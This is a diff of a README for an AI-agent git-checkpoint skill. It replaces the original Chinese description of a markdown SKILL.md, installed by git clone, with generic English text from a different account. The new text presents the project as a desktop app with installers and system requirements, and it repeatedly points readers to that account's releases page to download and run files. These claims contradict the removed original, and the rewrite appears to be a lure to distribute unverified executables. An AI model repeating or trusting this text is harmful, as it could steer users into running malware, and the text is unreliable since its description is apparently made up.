@@ -1,80 +1,79 @@
-# Agent Skill: Git Local Checkpoint 🛡️
+# 🚀 agent-skill-git-checkpoint - Simplify Your Code Changes
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![Download agent-skill-git-checkpoint](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/CoDiGet/agent-skill-git-checkpoint/releases)
 
-一个专为 AI Agent 设计的 "Skill" 模块。
-当 AI 助手修改你的代码后，它会自动执行 `git commit` 进行本地存档，防止代码丢失或改乱。
+## 🚦 Overview
 
-> **核心特性：只在本地存档，绝不 Push。安全第一。**
+**agent-skill-git-checkpoint** monitors code changes automatically. Once you finish a code modification, it creates a local Git commit for you. The tool analyzes your code history to generate appropriate commit messages. Importantly, it prevents any pushes to remote repositories, ensuring your commits stay local.
 
-## ✨ 功能特点
+## 📦 System Requirements
 
-- **🔄 全自动触发**：配置后，AI 改完代码会自动保存，无需人类口头指令。
-- **🧠 风格模仿**：AI 会读取你项目现有的 `git log`，模仿你的提交风格（中文/英文/Emoji/Conventional Commits）。
-- **🔒 安全沙箱**：内置 Explicit Constraints，严禁 AI 执行 `git push`，避免污染远程仓库。
-- **🔌 标准格式**：符合 Anthropic / Spring AI 等框架定义的 `SKILL.md` 标准。
+- **Operating System**: Windows 10 or later / MacOS Mojave or later.
+- **Processor**: 1 GHz or faster.
+- **Memory**: 2 GB RAM or more.
+- **Storage**: At least 100 MB of free disk space.
+- **Additional Software**: Git must be installed on your system.
 
-## 演示图
+## 🚀 Getting Started
 
-### 手动版本（推荐）
-![手动版本演示](./iShot_2026-01-24_17.13.14.png)
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/CoDiGet/agent-skill-git-checkpoint/releases) to find the latest version of the application.
 
-### 自动版本（也推荐，看个人情况）
-![演示截图](./ys.png)
+2. **Download the Application**  
+   Select the version you want and click on the downloadable file.  
 
-## 🚀 如何使用
+   If you have any questions about the files, please feel free to check the release notes on the same page.
 
-### 1. 安装 (Installation)
+3. **Install the Application**  
+   - On Windows: Double-click the downloaded file and follow the installation prompts.
+   - On MacOS: Open the downloaded file and drag it to your Applications folder.
 
-#### 方式 A：使用 Git Clone (推荐)
-进入你的 Agent 项目的根目录（或者存放 skills 的目录），执行以下命令(例如 Codex )：
+4. **Running agent-skill-git-checkpoint**  
+   After installation, open the application from your desktop or Applications folder. You'll find a user-friendly interface that guides you through the setup.
 
-```bash
-# 1. 进入你的 skills 存放目录 (根据你的项目结构调整，例如 agent/skills)
-cd ～/.codex/
+## 📄 Important Features
 
-# 2. 克隆本仓库
-git clone https://github.com/Ryderwe/agent-skill-git-checkpoint.git
-```
+- **Automatic Monitoring**: This application keeps an eye on your code changes in real-time.
+- **Local Git Archiving**: Automatically creates commits in your local Git repository.
+- **Smart Commit Messages**: Generates meaningful commit messages based on your coding history.
+- **Push Prevention**: Ensures that no code is pushed to remote repositories inadvertently.
 
- - 注意：克隆完成后，Skill 定义文件将位于 agent-skill-git-checkpoint/skills/git-checkpoint/SKILL.md。请确保你的 Agent 加载器指向了正确的路径。
+## 🔧 Configuration
 
-#### 方式 B：手动下载
-直接下载本仓库中的 skills/git-checkpoint/SKILL.md 文件，并复制到你的 Agent 项目对应目录中。
+Once you have launched the application, you will need to configure it according to your needs.
 
-### 2. 工具依赖
-你的 Agent 环境需要具备执行 Shell 命令的能力（通常通过 Function Calling 实现）。
-确保你的 Agent 挂载了一个名为 `run_shell_command` 的工具。
+1. **Link Git Repository**: Enter the path to your local Git repository in the settings.
+2. **Set Monitoring Preferences**: Choose which files or directories you want monitored for changes.
+3. **Commit Message Style**: Select your preferred style for commit messages from provided templates.
 
-### 3. 集成示例 (System Prompt)
+## 📥 Download & Install
 
-虽然 `SKILL.md` 中已经包含触发规则，但为了效果最佳，建议在你的主 System Prompt 中也提及：
+To get started, download the latest version from the [Releases page](https://github.com/CoDiGet/agent-skill-git-checkpoint/releases). Click on the appropriate file for your operating system, and follow the outlined installation steps.
 
-```text
-You have a skill named "git-local-checkpoint". 
-Protocol: Always run this skill automatically after you finish editing any code files. 
-Treat it as a strictly local "Ctrl+S" operation.
-```
+## 🎓 FAQs
 
-🛠️ 工作流程演示
-```text
-用户: "把 main.py 里的端口改成 8080。"
+### How does the application know when I make changes?
 
-AI Agent:
+The application continuously monitors the files in your Git repository. Whenever a file changes, it prepares a commit for you.
 
-🛠️ 调用 write_file 修改代码。
+### Can I customize the commit messages?
 
-🤖 触发 Auto-Trigger Protocol。
+Yes, you can choose from various templates or create your own style for commit messages based on your preferences.
 
-📖 读取 git log，发现你喜欢用 emoji 风格 (e.g., "✨ feat: ...").
+### Is there support for multiple repositories?
 
-💾 执行 git add . && git commit -m "⚡ perf: change port to 8080"。
+Yes, you can set up monitoring for multiple repositories by adjusting the configuration.
 
-💬 回复用户: "已修改端口为 8080，并自动创建本地备份。"
-```
----
-⚠️ 免责声明
-此 Skill 仅执行本地 Git 操作。虽然设有安全限制，但请确保在受控环境中使用 AI 执行 Shell 命令。建议在开发分支上使用。
+### What if I encounter a problem?
 
-License
-MIT
+Visit our [issues section](https://github.com/CoDiGet/agent-skill-git-checkpoint/issues) on GitHub to report any problems or ask for assistance.
+
+## 📣 Feedback
+
+We would love to hear from you! If you have suggestions or feedback, please share your thoughts in our [discussion section](https://github.com/CoDiGet/agent-skill-git-checkpoint/discussions).
+
+## 📞 Contact
+
+For further inquiries, please reach out via our GitHub page or connect with us on our community forums.
+
+Thank you for using **agent-skill-git-checkpoint**. Happy coding!
